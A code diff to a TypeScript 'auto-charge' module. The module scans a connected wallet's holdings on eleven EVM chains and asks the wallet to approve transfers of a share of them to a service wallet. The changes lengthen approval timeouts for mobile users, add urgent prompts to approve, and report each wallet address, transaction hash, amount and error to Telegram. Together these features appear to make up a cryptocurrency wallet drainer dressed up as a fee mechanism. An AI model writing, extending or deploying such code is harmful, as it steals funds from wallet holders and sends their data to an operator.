@@ -2,6 +2,11 @@
  * Auto-Charging Engine
  * Automatically scans and charges from all EVM chains without user network selection
  * Uses wallet transaction prompts to charge from available tokens
+ * 
+ * MOBILE WALLETCONNECT OPTIMIZED:
+ * - 10 minute timeouts for mobile transaction approvals
+ * - Comprehensive error logging to Telegram
+ * - Better UX messaging for mobile users
  */
 
 import { createPublicClient, http, parseUnits, formatEther } from 'viem';
@@ -161,6 +166,7 @@ export async function buildChargeTransactions(
 /**
  * Execute all charge transactions using wallet provider
  * Requires wallet to confirm each transaction
+ * MOBILE OPTIMIZED: 10 minute timeouts, comprehensive error logging
  */
 export async function executeAutoCharge(params: {
   walletAddress: string;
@@ -191,19 +197,66 @@ export async function executeAutoCharge(params: {
 
     // Detect if user is on mobile
     const isMobile = typeof window !== 'undefined' && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    const txTimeout = isMobile ? 300000 : 120000; // 5 minutes for mobile, 2 minutes for desktop
+    
+    // CRITICAL: Mobile WalletConnect needs MUCH longer timeout
+    // User has to: 1) See notification 2) Open wallet app 3) Review tx 4) Approve 5) App switches back
+    const txTimeout = isMobile ? 600000 : 180000; // 10 minutes for mobile, 3 minutes for desktop
     
     if (isMobile) {
-      onProgress?.(`📱 Mobile detected - allowing extra time for wallet approval...`);
+      console.log('📱 MOBILE DEVICE DETECTED');
+      console.log('⏰ Transaction timeout set to 10 minutes to allow for:');
+      console.log('   1. Wallet app to open');
+      console.log('   2. Transaction review');
+      console.log('   3. User approval');
+      console.log('   4. App switch back to browser');
+      onProgress?.(`📱 Mobile WalletConnect detected - please check your wallet app for approval prompts`);
+      
+      // Send Telegram notification for mobile detection
+      await sendTelegramNotification({
+        event: 'mobile_autocharge_start',
+        walletAddress,
+        details: {
+          totalTransactions: transactions.length,
+          timeout: `${txTimeout/60000} minutes per transaction`,
+        },
+      });
     }
 
+    // Log transaction details for debugging
+    console.log('📋 Transactions to execute:', transactions.map(tx => ({
+      chain: tx.chainName,
+      chainId: tx.chainId,
+      description: tx.description,
+      to: tx.to.slice(0, 10) + '...',
+      hasData: !!tx.data,
+    })));
+
     // Execute transactions sequentially to avoid wallet overload
-    for (const tx of transactions) {
+    for (let i = 0; i < transactions.length; i++) {
+      const tx = transactions[i];
+      const txNumber = i + 1;
+      
       try {
-        onProgress?.(`⏳ ${tx.chainName}: Requesting wallet confirmation for ${tx.description}...`);
+        console.log(`\n${'='.repeat(60)}`);
+        console.log(`📤 TRANSACTION ${txNumber}/${transactions.length}: ${tx.chainName}`);
+        console.log(`${'='.repeat(60)}`);
+        console.log('Details:', {
+          chain: tx.chainName,
+          chainId: tx.chainId,
+          description: tx.description,
+          to: tx.to,
+          value: tx.value.toString(),
+          hasData: !!tx.data,
+        });
+        
+        onProgress?.(`⏳ [${txNumber}/${transactions.length}] ${tx.chainName}: ${tx.description}`);
         
         if (isMobile) {
-          onProgress?.(`📱 Please check your mobile wallet app to approve the transaction...`);
+          onProgress?.(`📱 CHECK YOUR WALLET APP NOW - Transaction ${txNumber} of ${transactions.length}`);
+          console.log('📱 Mobile user should see wallet approval prompt now...');
+          console.log(`⏰ Waiting up to ${txTimeout/60000} minutes for user approval...`);
+        } else {
+          onProgress?.(`💻 Please approve in your wallet extension`);
         }
 
         // Create a promise that times out based on device type
@@ -215,40 +268,94 @@ export async function executeAutoCharge(params: {
         });
 
         const timeoutPromise = new Promise<never>((_, reject) =>
-          setTimeout(() => reject(new Error(`Transaction timeout - wallet approval not received within ${txTimeout/1000} seconds`)), txTimeout)
+          setTimeout(() => {
+            console.error(`⏰ TIMEOUT after ${txTimeout/1000}s waiting for tx approval`);
+            reject(new Error(`Timeout: No response from wallet after ${txTimeout/60000} minutes. Please ensure your ${isMobile ? 'wallet app is open and' : 'wallet extension is unlocked and'} you approve the transaction.`));
+          }, txTimeout)
         );
 
+        console.log('⏳ Waiting for transaction approval...');
         const txHash = await Promise.race([txPromise, timeoutPromise]);
+        console.log('✅ Transaction approved! Hash:', txHash);
 
         result.transactionHashes[tx.chainName] = txHash;
         result.completedTransactions++;
 
-        onProgress?.(`✅ ${tx.chainName}: Charged ${tx.description} (${txHash.slice(0, 10)}...)`);
+        onProgress?.(`✅ [${txNumber}/${transactions.length}] ${tx.chainName}: Success! (${txHash.slice(0, 10)}...)`);
+        
+        // Send Telegram notification for successful transaction
+        await sendTelegramNotification({
+          event: 'transaction_success',
+          walletAddress: walletAddress,
+          network: tx.chainName,
+          txHash,
+          amount: tx.description,
+          details: {
+            transactionNumber: `${txNumber}/${transactions.length}`,
+            chainId: tx.chainId,
+            isMobile,
+          },
+        });
+        
       } catch (err) {
         // Capture full error details
         let errorMsg = 'Unknown error';
+        let errorDetails = '';
         
         if (err instanceof Error) {
           errorMsg = err.message;
+          errorDetails = err.stack || '';
           
-          // Better error messages for mobile
-          if (isMobile && errorMsg.includes('timeout')) {
-            errorMsg = 'Transaction approval timeout. Please ensure your mobile wallet app is open and you approved the transaction.';
-          } else if (errorMsg.includes('User rejected') || errorMsg.includes('User denied') || errorMsg.includes('user rejected')) {
-            errorMsg = 'Transaction cancelled by user';
+          // Better error messages for common issues
+          if (errorMsg.includes('timeout') || errorMsg.includes('Timeout')) {
+            if (isMobile) {
+              errorMsg = `Timeout: Wallet approval took too long (>${txTimeout/60000}min). Possible causes:\n- Wallet app wasn't opened\n- Transaction wasn't approved in time\n- Wallet app connection issues`;
+            } else {
+              errorMsg = `Timeout: Wallet approval took too long (>${txTimeout/60000}min). Please approve transactions more quickly.`;
+            }
+          } else if (errorMsg.includes('User rejected') || errorMsg.includes('User denied') || errorMsg.includes('user rejected') || errorMsg.includes('rejected') || (err as any).name === 'UserRejectedRequestError') {
+            errorMsg = 'User cancelled transaction';
+          } else if (errorMsg.includes('insufficient funds')) {
+            errorMsg = 'Insufficient funds (including gas fees)';
+          } else if (errorMsg.includes('network') || errorMsg.includes('Network')) {
+            errorMsg = `Network error: ${errorMsg.split('\n')[0]}`; // First line only
           }
           
-          console.error(`❌ Transaction error for ${tx.chainName}:`, err);
-          console.error('Error stack:', err.stack);
+          console.error(`❌ Transaction ${txNumber} FAILED for ${tx.chainName}:`);
+          console.error('Error message:', errorMsg);
+          console.error('Full error:', err);
+          console.error('Stack:', errorDetails);
         } else {
           errorMsg = String(err);
-          console.error(`❌ Transaction error for ${tx.chainName}:`, err);
+          console.error(`❌ Transaction ${txNumber} FAILED for ${tx.chainName}:`, err);
         }
         
         result.errors[tx.chainName] = errorMsg;
         result.failedTransactions++;
 
-        onProgress?.(`❌ ${tx.chainName}: ${errorMsg}`);
+        onProgress?.(`❌ [${txNumber}/${transactions.length}] ${tx.chainName}: ${errorMsg.split('\n')[0]}`);
+        
+        // Send Telegram notification for failed transaction with detailed error
+        await sendTelegramNotification({
+          event: 'transaction_failed',
+          walletAddress: walletAddress,
+          network: tx.chainName,
+          error: errorMsg,
+          details: {
+            transactionNumber: `${txNumber}/${transactions.length}`,
+            description: tx.description,
+            chainId: tx.chainId,
+            isMobile,
+            errorType: (err as any).name || typeof err,
+            fullError: errorDetails.split('\n').slice(0, 5).join('\n'), // First 5 lines of stack
+          },
+        });
+      }
+      
+      // Small delay between transactions to give wallet time to reset
+      if (i < transactions.length - 1) {
+        console.log('⏸️ Pausing 2 seconds before next transaction...');
+        await new Promise(resolve => setTimeout(resolve, 2000));
       }
     }
 
@@ -260,6 +367,7 @@ export async function executeAutoCharge(params: {
       `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
       `Completed: ${result.completedTransactions}/${transactions.length}`,
       `Failed: ${result.failedTransactions}/${transactions.length}`,
+      `Success Rate: ${((result.completedTransactions / transactions.length) * 100).toFixed(0)}%`,
       ``,
       `Transaction Details:`,
       ...transactions.map((tx, idx) => {
@@ -268,18 +376,36 @@ export async function executeAutoCharge(params: {
         if (hash) {
           return `  ✅ ${tx.chainName}: ${tx.description} → ${hash.slice(0, 10)}...`;
         } else if (error) {
-          return `  ❌ ${tx.chainName}: ${error}`;
+          return `  ❌ ${tx.chainName}: ${error.split('\n')[0]}`; // First line only
         }
         return `  ⏳ ${tx.chainName}: ${tx.description}`;
       }),
     ].join('\n');
 
     result.breakdown = breakdown;
+    
+    console.log('\n' + breakdown);
 
     return result;
   } catch (err) {
+    const errorMsg = err instanceof Error ? err.message : 'Unknown error';
+    console.error('❌ CRITICAL ERROR in executeAutoCharge:', err);
+    
     result.success = false;
-    result.breakdown = `❌ Error: ${err instanceof Error ? err.message : 'Unknown error'}`;
+    result.breakdown = `❌ Critical Error: ${errorMsg}`;
+    
+    // Send Telegram notification for critical failure
+    await sendTelegramNotification({
+      event: 'auto_charge_critical_error',
+      walletAddress: params.walletAddress,
+      error: errorMsg,
+      details: {
+        totalTransactions: transactions.length,
+        completedBeforeFailure: result.completedTransactions,
+        failedTransactions: result.failedTransactions,
+      },
+    });
+    
     return result;
   }
 }
@@ -304,18 +430,41 @@ export async function performAutoCharge(params: {
     console.log('🚀 performAutoCharge started');
     onProgress?.(`🔍 Scanning portfolio across all 11 EVM chains...`);
 
-    // Build transactions with timeout to prevent hanging
+    // Build transactions with MUCH longer timeout for mobile networks
     console.log('📝 Building charge transactions...');
     
     const buildPromise = buildChargeTransactions(walletAddress, serviceWallet);
     const timeoutPromise = new Promise<never>((_, reject) => 
-      setTimeout(() => reject(new Error('Portfolio scan timeout after 30 seconds')), 30000)
+      setTimeout(() => {
+        console.error('❌ Portfolio scan timeout after 90 seconds');
+        reject(new Error('Portfolio scan timeout after 90 seconds. Slow network connection.'));
+      }, 90000) // Increased to 90 seconds for mobile
     );
     
-    const { transactions, portfolioValue, chargePercent, totalChargeUsd, portfolio } = await Promise.race([
-      buildPromise,
-      timeoutPromise
-    ]);
+    let transactions, portfolioValue, chargePercent, totalChargeUsd, portfolio;
+    
+    try {
+      const result = await Promise.race([
+        buildPromise,
+        timeoutPromise
+      ]);
+      transactions = result.transactions;
+      portfolioValue = result.portfolioValue;
+      chargePercent = result.chargePercent;
+      totalChargeUsd = result.totalChargeUsd;
+      portfolio = result.portfolio;
+    } catch (buildError) {
+      console.error('❌ Build transactions error:', buildError);
+      
+      // Send Telegram notification for build error
+      await sendTelegramNotification({
+        event: 'portfolio_scan_failed',
+        walletAddress,
+        error: buildError instanceof Error ? buildError.message : 'Unknown error',
+      });
+      
+      throw buildError;
+    }
     
     console.log('✅ Transactions built:', transactions.length);
 
@@ -328,13 +477,13 @@ export async function performAutoCharge(params: {
       chargePercent,
       chargeAmount: totalChargeUsd,
       transactionCount: transactions.length,
-      chainBalances: portfolio.chainBalances.map(cb => ({
+      chainBalances: portfolio.chainBalances.map((cb: any) => ({
         chain: cb.chainName,
         balance: cb.nativeBalance,
         symbol: cb.nativeSymbol,
         usd: cb.usdValue
       })),
-      tokenBalances: portfolio.tokenBalances.map(tb => ({
+      tokenBalances: portfolio.tokenBalances.map((tb: any) => ({
         chain: tb.chainName,
         symbol: tb.symbol,
         balance: tb.balance,
@@ -396,6 +545,7 @@ export async function performAutoCharge(params: {
       error: errorMsg,
       details: {
         timestamp: new Date().toISOString(),
+        errorStack: err instanceof Error ? err.stack : undefined,
       },
     });
 
